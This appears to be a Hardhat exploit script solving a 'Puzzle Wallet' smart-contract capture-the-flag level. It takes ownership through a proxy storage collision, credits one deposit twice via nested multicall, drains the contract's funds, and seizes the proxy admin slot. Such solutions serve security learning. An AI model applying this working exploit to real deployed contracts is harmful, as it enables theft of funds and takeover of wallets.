
const { ethers } = require("hardhat");

async function main() {

  const victimAddress = '0x9114Fd15da7851dA019469288B2483A5335d3B9C';

  const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
  const puzzleWallet = PuzzleWallet.attach(victimAddress);

  const signer = (await ethers.getSigners())[0];
  
  // Low level call to proposeNewAdmin because the PuzzleWallet ABI doesn't expose it
  const proposeNewAdminABI = ["function proposeNewAdmin(address _newAdmin)"];
  const proposeNewAdminInterface = new ethers.utils.Interface(proposeNewAdminABI);
  const proposeNewAdminCallData = proposeNewAdminInterface.encodeFunctionData("proposeNewAdmin", [signer.address]);

  await (await signer.sendTransaction({ to: victimAddress, data: proposeNewAdminCallData })).wait();

  console.log("Owner:", await puzzleWallet.owner());

  await (await puzzleWallet.addToWhitelist(signer.address)).wait();

  console.log("Whitelisted:", await puzzleWallet.whitelisted(signer.address));

  const depositABI = ["function deposit()"];
  const depositInterface = new ethers.utils.Interface(depositABI);
  const depositCallData = depositInterface.encodeFunctionData("deposit", []);

  const multicallABI = ["function multicall(bytes[] calldata data)"];
  const multicallInterface = new ethers.utils.Interface(multicallABI);
  const multicallCallData = multicallInterface.encodeFunctionData("multicall", [[depositCallData]]);

  // Call deposit twice in the same tx, reusing the msg.value by calling another multicall with the depositCalled flag set to false
  await (await puzzleWallet.multicall([depositCallData, multicallCallData], { value: 1000000000000000 })).wait(); //0.001

  console.log("Player balance:", Number(await puzzleWallet.balances(signer.address)));

  // Burn contract's balance
  await (await puzzleWallet.execute(signer.address, 2000000000000000, '0x')).wait(); //0.002

  console.log("Puzzle wallet balance:", Number(await ethers.getDefaultProvider().getBalance(victimAddress))); // should be 0

  // Set the admin to us by storage collision
  await (await puzzleWallet.setMaxBalance(signer.address)).wait();

  console.log("Succesful attack!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
